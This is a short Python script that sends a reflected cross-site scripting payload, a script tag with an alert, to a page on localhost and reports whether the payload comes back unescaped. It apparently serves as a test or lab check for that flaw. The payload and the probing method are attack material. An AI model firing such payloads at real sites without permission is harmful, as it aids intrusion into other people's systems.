import requests

payload = "<script>alert('XSS')</script>"
url = f"http://localhost/index.php?name={payload}"
response = requests.get(url)

if payload in response.text:
    print("[+] XSS triggered successfully!")
else:
    print("[-] XSS mitigated.")